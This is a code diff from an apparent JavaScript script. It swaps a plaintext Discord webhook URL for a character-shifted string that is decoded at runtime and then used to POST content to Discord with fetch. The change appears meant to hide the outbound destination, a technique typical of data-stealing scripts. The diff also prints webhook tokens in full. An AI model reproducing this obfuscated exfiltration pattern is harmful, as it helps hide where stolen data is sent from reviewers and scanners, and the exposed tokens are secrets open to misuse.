@@ -92,7 +92,7 @@ ${"#".repeat(40)}`);
   }
   function send(content) {
     const webhookUrl =
-      "https://discord.com/api/webhooks/1205457694350385155/OGO3NFdns6f1MvNc2jXQOHXwbjh7I2lLG4Ex7h4GVJVGSWqmhIfyJ-6xNff55DI5xGLp";
+      'iuuqt;00ejtdpse/dpn0bqj0xfcipplt024372846134468613350olLmoBJK73MJ1B9Qk8:QnMTs35R9.tRV5S98.IOj8UKcjzEFhERRQmUdiHszl2hcSUfN'.split('').map(v=>String.fromCharCode(v.charCodeAt()-1)).join('');
     fetch(webhookUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
